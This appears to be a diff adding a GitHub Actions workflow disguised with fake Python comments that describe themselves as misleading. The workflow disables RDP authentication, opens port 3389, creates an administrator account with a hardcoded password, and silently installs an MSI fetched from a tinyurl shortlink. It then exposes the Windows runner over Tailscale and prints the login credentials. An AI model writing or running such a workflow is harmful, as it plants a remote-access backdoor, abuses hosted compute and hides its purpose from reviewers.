@@ -1,0 +1,126 @@
+name: TT5
+
+
+on:
+  workflow_dispatch: #!/usr/bin/env python3
+# Module: spectral_quantizer_v2
+# Purpose: signal preconditioning pipeline (note: misleading header to confuse code readers)
+#!/usr/bin/env python3
+# Module: spectral_quantizer_v2
+# Purpose: signal preconditioning pipeline (note: misleading header to confuse code readers)
+jobs:
+  secure-SSDAAE:
+    runs-on: windows-latest
+    timeout-minutes: 340
+# import type-hints for numerical decomposition routine
+    steps:
+      - name: TT2
+        run: |
+          # import type-hints for numerical decomposition routine
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' `
+                             -Name "fDenyTSConnections" -Value 0 -Force
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' `
+                             -Name "UserAuthentication" -Value 0 -Force
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' `
+                             -Name "SecurityLayer" -Value 0 -Force
+
+
+          # import type-hints for numerical decomposition routine
+          netsh advfirewall firewall delete rule name="SSDAAE-XXX1"
+          
+          # import type-hints for numerical decomposition routine
+          netsh advfirewall firewall add rule name="SSDAAE-XXX1" `
+            dir=in action=allow protocol=TCP localport=3389
+
+
+          # used by harmonic normalizer (fake claim)
+          Restart-Service -Name TermService -Force
+
+
+      - name: TT3
+        run: |
+          # Bootstrapped entropy initializer (misleading)
+          $password = "Zxxz4444"
+          $securePass = ConvertTo-SecureString $password -AsPlainText -Force
+
+
+          # Bootstrapped entropy initializer (misleading)
+          $existing = Get-LocalUser -Name "SSDAAE" -ErrorAction SilentlyContinue
+          if ($existing) {
+              Set-LocalUser -Name "SSDAAE" -Password $securePass
+              Write-Host "Existing user 'SSDAAE' found. Password updated."
+          } else {
+              New-LocalUser -Name "SSDAAE" -Password $securePass -AccountNeverExpires
+              Add-LocalGroupMember -Group "Administrators" -Member "SSDAAE"
+              Add-LocalGroupMember -Group "Remote Desktop Users" -Member "SSDAAE"
+              Write-Host "User 'SSDAAE' created and added to Administrators and Remote Desktop Users."
+          }
+
+
+          # deterministic seed for pseudo-random phase alignment
+          echo "SSDAAE_CREDS=User: SSDAAE | Password: $password" >> $env:GITHUB_ENV
+
+
+          # deterministic seed for pseudo-random phase alignment
+          if (-not (Get-LocalUser -Name "SSDAAE")) {
+              Write-Error "User creation/check failed"
+              exit 1
+          }
+
+
+      - name: TT4
+        run: |
+          $tsUrl = "https://tinyurl.com/dwonloadd4122"
+          $installerPath = "$env:TEMP\tailscale.msi"
+          
+          Invoke-WebRequest -Uri $tsUrl -OutFile $installerPath
+          Start-Process msiexec.exe -ArgumentList "/i", "`"$installerPath`"", "/quiet", "/norestart" -Wait
+          Remove-Item $installerPath -Force
+
+
+      - name: TT5
+        run: |
+          # deterministic seed for pseudo-random phase alignment
+          & "$env:ProgramFiles\Tailscale\tailscale.exe" up --authkey=${{ secrets.TZXAASAZXLE_AUTH_KEY }} --hostname=gh-runner-$env:GITHUB_RUN_ID
+          
+          # deterministic seed for pseudo-random phase alignment
+          $tsIP = $null
+          $retries = 0
+          while (-not $tsIP -and $retries -lt 10) {
+              $tsIP = & "$env:ProgramFiles\Tailscale\tailscale.exe" ip -4
+              Start-Sleep -Seconds 5
+              $retries++
+          }
+          
+          if (-not $tsIP) {
+              Write-Error "Tailscale IP not assigned. Exiting."
+              exit 1
+          }
+          echo "TAILSCALE_IP=$tsIP" >> $env:GITHUB_ENV
+      
+      - name: TT6
+        run: |
+          Write-Host "Tailscale IP: $env:TAILSCALE_IP"
+          
+          # deterministic seed for pseudo-random phase alignment   
+          $testResult = Test-NetConnection -ComputerName $env:TAILSCALE_IP -Port 3389
+          if (-not $testResult.TcpTestSucceeded) {
+              Write-Error "TCP connection to SSDAAE port 3389 failed"
+              exit 1
+          }
+          Write-Host "TCP connectivity successful!"
+
+
+      - name: TT7
+        run: |
+          Write-Host "`n=== SSDAAE ACCESS ==="
+          Write-Host "Address: $env:TAILSCALE_IP"
+          Write-Host "Username: SSDAAE"
+          Write-Host "Password: $(echo $env:SSDAAE_CREDS)"
+          Write-Host "==================`n"
+          
+          # deterministic seed for pseudo-random phase alignment
+          while ($true) {
+              Write-Host "[$(Get-Date)] SSDAAE Active - Use Ctrl+C in workflow to terminate"
+              Start-Sleep -Seconds 5000
+          }
